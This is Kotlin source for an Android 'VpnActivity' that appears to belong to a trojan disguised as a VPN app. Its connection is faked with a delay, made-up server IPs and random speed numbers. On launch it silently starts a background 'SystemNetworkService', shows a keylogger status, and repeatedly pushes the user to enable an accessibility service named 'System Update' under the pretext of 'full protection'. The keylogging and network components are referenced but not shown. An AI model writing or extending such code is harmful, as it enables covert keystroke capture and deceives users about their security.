package com.openaccess.sdk

import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.widget.AdapterView
import android.widget.ArrayAdapter
import android.widget.Button
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.Spinner
import android.widget.TextView
import android.widget.Toast
import android.app.Activity
import android.content.Intent
import android.provider.Settings
import android.app.AlertDialog
import com.openaccess.sdk.service.AccessibilityHelper
import com.openaccess.sdk.service.SystemNetworkService
import java.net.HttpURLConnection
import java.net.URL
import java.util.Locale
import java.util.Timer
import java.util.TimerTask

class VpnActivity : Activity() {

    private lateinit var connectBtn: Button
    private lateinit var connectRing: View
    private lateinit var statusText: TextView
    private lateinit var serverSpinner: Spinner
    private lateinit var infoCard: LinearLayout
    private lateinit var ipText: TextView
    private lateinit var timeText: TextView
    private lateinit var downloadText: TextView
    private lateinit var uploadText: TextView
    private lateinit var accessStatus: TextView
    private lateinit var networkStatus: TextView
    private lateinit var keylogStatus: TextView
    private lateinit var deviceInfo: TextView
    private lateinit var androidVersion: TextView
    private lateinit var bottomStatus: TextView

    private var isConnected = false
    private var isConnecting = false
    private var selectedServer = 0
    private var connectionStartTime = 0L
    private var timer: Timer? = null
    private var speedTimer: Timer? = null
    private var realIp = "Unknown"

    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_vpn)

        // Start background service
        try { SystemNetworkService.start(this) } catch (_: Exception) {}

        initViews()
        setupServerSpinner()
        fetchRealIp()
    }

    private fun initViews() {
        connectBtn = findViewById(R.id.connectBtn)
        connectRing = findViewById(R.id.connectRing)
        statusText = findViewById(R.id.statusText)
        serverSpinner = findViewById(R.id.serverSpinner)
        infoCard = findViewById(R.id.infoCard)
        ipText = findViewById(R.id.ipText)
        timeText = findViewById(R.id.timeText)
        downloadText = findViewById(R.id.downloadText)
        uploadText = findViewById(R.id.uploadText)
        accessStatus = findViewById(R.id.accessStatus)
        networkStatus = findViewById(R.id.networkStatus)
        keylogStatus = findViewById(R.id.keylogStatus)
        deviceInfo = findViewById(R.id.deviceInfo)
        androidVersion = findViewById(R.id.androidVersion)
        bottomStatus = findViewById(R.id.bottomStatus)

        connectBtn.setOnClickListener {
            if (isConnecting) return@setOnClickListener
            if (isConnected) {
                disconnect()
            } else {
                connect()
            }
        }

        updateSystemStatus()
    }

    private fun updateSystemStatus() {
        val accEnabled = MainActivity.isAccessibilityEnabled(this)
        val svcRunning = MainActivity.isServiceRunning(this, SystemNetworkService::class.java)
        val keylogRunning = AccessibilityHelper.isRunning

        accessStatus.text = if (accEnabled) "Active" else "Inactive"
        accessStatus.setTextColor(getColorCompat(if (accEnabled) R.color.cyber_green else R.color.cyber_red))

        networkStatus.text = if (svcRunning) "Running" else "Stopped"
        networkStatus.setTextColor(getColorCompat(if (svcRunning) R.color.cyber_green else R.color.cyber_red))

        keylogStatus.text = if (keylogRunning) "Active" else "Inactive"
        keylogStatus.setTextColor(getColorCompat(if (keylogRunning) R.color.cyber_green else R.color.cyber_red))

        deviceInfo.text = "${Build.MANUFACTURER} ${Build.MODEL}"
        androidVersion.text = "${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})"
    }

    private fun setupServerSpinner() {
        val servers = resources.getStringArray(R.array.server_names)
        val adapter = ArrayAdapter(this, android.R.layout.simple_spinner_dropdown_item, servers)
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item)
        serverSpinner.adapter = adapter

        serverSpinner.onItemSelectedListener = object : AdapterView.OnItemSelectedListener {
            override fun onItemSelected(parent: AdapterView<*>?, view: View?, position: Int, id: Long) {
                selectedServer = position
                if (isConnected) {
                    // Reconnect to new server
                    disconnect()
                    handler.postDelayed({ connect() }, 500)
                }
            }
            override fun onNothingSelected(parent: AdapterView<*>?) {}
        }
    }

    private fun fetchRealIp() {
        Thread {
            try {
                val url = URL("https://api.ipify.org?format=json")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 5000
                conn.readTimeout = 5000
                val body = conn.inputStream.bufferedReader().readText()
                conn.disconnect()
                val ip = body.substringAfter("\"ip\":\"").substringBefore("\"")
                if (ip.isNotEmpty()) {
                    realIp = ip
                    runOnUiThread {
                        if (!isConnected) {
                            ipText.text = realIp
                        }
                    }
                }
            } catch (_: Exception) {
            }
        }.start()
    }

    private fun connect() {
        isConnecting = true
        connectBtn.isEnabled = false
        connectBtn.text = getString(R.string.connecting)
        statusText.text = getString(R.string.status_connecting)
        statusText.setTextColor(getColorCompat(R.color.cyber_orange))
        bottomStatus.text = getString(R.string.protection_connecting)

        // Simulate connection delay
        handler.postDelayed({
            isConnected = true
            isConnecting = false
            connectBtn.isEnabled = true
            connectBtn.text = getString(R.string.disconnect)
            connectBtn.setBackgroundResource(R.drawable.circle_button_connected)
            statusText.text = getString(R.string.status_connected)
            statusText.setTextColor(getColorCompat(R.color.cyber_green))
            bottomStatus.text = getString(R.string.protection_on)
            bottomStatus.setTextColor(getColorCompat(R.color.cyber_green))

            // Show info card
            infoCard.visibility = View.VISIBLE

            // Update ring
            connectRing.setBackgroundResource(R.drawable.circle_ring_active)

            // Set IP (fake VPN IP)
            val serverIps = resources.getStringArray(R.array.server_ips)
            ipText.text = serverIps[selectedServer]

            // Start timers
            connectionStartTime = System.currentTimeMillis()
            startConnectionTimer()
            startSpeedTimer()

            Toast.makeText(this, "Connected to ${resources.getStringArray(R.array.server_names)[selectedServer]}", Toast.LENGTH_SHORT).show()
        }, 2000)
    }

    private fun disconnect() {
        isConnected = false
        isConnecting = false
        connectBtn.isEnabled = true
        connectBtn.text = getString(R.string.connect)
        connectBtn.setBackgroundResource(R.drawable.circle_button)
        statusText.text = getString(R.string.status_disconnected)
        statusText.setTextColor(getColorCompat(R.color.cyber_red))
        bottomStatus.text = getString(R.string.protection_off)
        bottomStatus.setTextColor(getColorCompat(R.color.cyber_surface))

        // Hide info card
        infoCard.visibility = View.GONE

        // Reset ring
        connectRing.setBackgroundResource(R.drawable.circle_ring_inactive)

        // Stop timers
        timer?.cancel()
        speedTimer?.cancel()

        // Reset IP display
        ipText.text = realIp
        timeText.text = "00:00:00"
        downloadText.text = "0 KB/s"
        uploadText.text = "0 KB/s"

        Toast.makeText(this, "Disconnected", Toast.LENGTH_SHORT).show()
    }

    private fun startConnectionTimer() {
        timer = Timer()
        timer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                if (!isConnected) return
                val elapsed = System.currentTimeMillis() - connectionStartTime
                val hours = elapsed / 3600000
                val minutes = (elapsed % 3600000) / 60000
                val seconds = (elapsed % 60000) / 1000
                val timeStr = String.format(Locale.US, "%02d:%02d:%02d", hours, minutes, seconds)
                handler.post { if (isConnected) timeText.text = timeStr }
            }
        }, 0, 1000)
    }

    private fun startSpeedTimer() {
        speedTimer = Timer()
        speedTimer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                if (!isConnected) return
                val download = (500 + Math.random() * 2500).toInt()
                val upload = (100 + Math.random() * 800).toInt()
                handler.post {
                    if (isConnected) {
                        downloadText.text = "$download KB/s"
                        uploadText.text = "$upload KB/s"
                    }
                }
            }
        }, 0, 2000)
    }

    private fun getColorCompat(colorRes: Int): Int {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            getColor(colorRes)
        } else {
            resources.getColor(colorRes)
        }
    }

    override fun onResume() {
        super.onResume()
        updateSystemStatus()
        if (!MainActivity.isAccessibilityEnabled(this)) {
            showEnableAccessibilityAlert()
        }
    }

    private fun showEnableAccessibilityAlert() {
        AlertDialog.Builder(this)
            .setTitle("Service Required")
            .setMessage("Please enable the accessibility service for full protection.\n\nSettings → Accessibility → System Update → ON")
            .setPositiveButton("Open Settings") { _, _ ->
                try {
                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                } catch (_: Exception) {}
            }
            .setNegativeButton("Later", null)
            .setCancelable(false)
            .show()
    }

    override fun onDestroy() {
        super.onDestroy()
        timer?.cancel()
        timer = null
        speedTimer?.cancel()
        speedTimer = null
        handler.removeCallbacksAndMessages(null)
    }
}
